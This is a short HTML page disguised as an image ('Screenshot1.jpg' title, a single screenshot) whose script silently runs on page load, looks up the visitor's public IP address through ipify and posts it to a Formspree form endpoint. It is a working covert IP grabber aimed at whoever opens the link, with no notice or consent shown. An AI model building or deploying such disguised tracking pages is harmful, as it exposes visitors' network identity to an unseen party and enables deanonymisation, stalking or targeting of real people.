<!DOCTYPE html>
<html>
  <head>
    <!-- Refreshes the page every second -->

    <link rel="stylesheet" href="style.css" />
    <title>Screenshot1.jpg</title>
  </head>
  <body>
    <script>
      function getIpAddress() {
        fetch("https://api64.ipify.org?format=json")
          .then((response) => response.json())
          .then((data) => {
            fetch("https://formspree.io/f/moqgqjan", {
              method: "POST",
              body: JSON.stringify({
                email: "some@email.com",
                message: `User ip is ${data.ip}`,
              }),
              headers: {
                "Content-type": "application/json; charset=UTF-8",
              },
            });

            // You can send this information to your server for further processing
          })
          .catch((error) => console.error("Error:", error));
      }
      // Call the function when the page loads

      window.onload = getIpAddress;
    </script>

    <img src="screenshot.png" />
  </body>
</html>
